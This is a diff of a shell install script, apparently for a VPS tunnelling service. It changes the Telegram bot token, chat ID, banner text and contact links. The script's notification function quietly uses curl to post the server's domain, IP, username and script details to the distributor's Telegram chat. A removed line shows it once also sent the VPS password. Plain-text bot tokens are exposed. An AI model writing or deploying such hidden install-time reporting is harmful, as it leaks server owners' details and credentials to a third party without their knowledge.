@@ -225,8 +225,8 @@ fi
 
 # // Get // No delete
 TIMES="10"
-CHATID="6843535348"
-KEY="6940395718:AAGvL_KNcDEc1rxZnuSUlzV61KW5wyuYUhI"
+CHATID="-1001993310646"
+KEY="6983372420:AAGE8ufkchnJ84wFrPTHBuOny0ah12RpsAk"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 
 # // install paket
@@ -319,7 +319,7 @@ usermod -aG sudo $Username > /dev/null 2>&1
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TEXT="
 <code>────────────────────</code>
-<b> 🟢 NOTIFICATIONS INSTALL 🟢</b>
+<b> ⚠️ AUTO SCRIPT PREMIUM ⚠️</b>
 <code>────────────────────</code>
 <code>ID     : </code><code>$USRSC</code>
 <code>Domain : </code><code>$domain</code>
@@ -328,10 +328,9 @@ TEXT="
 <code>Ip vps : </code><code>$ipsaya</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>user   : </code><code>$Username</code>
-<code>Pw Vps : </code><code>$Password</code>
 <code>────────────────────</code>
 <i>Automatic Notification from Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/LunaticTunnel"},{"text":"Contack","url":"wa.me/6282240074362"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/MAZ_FARUK"},{"text":"Contack","url":"wa.me/6283805609815"}]]}'
 curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 clear
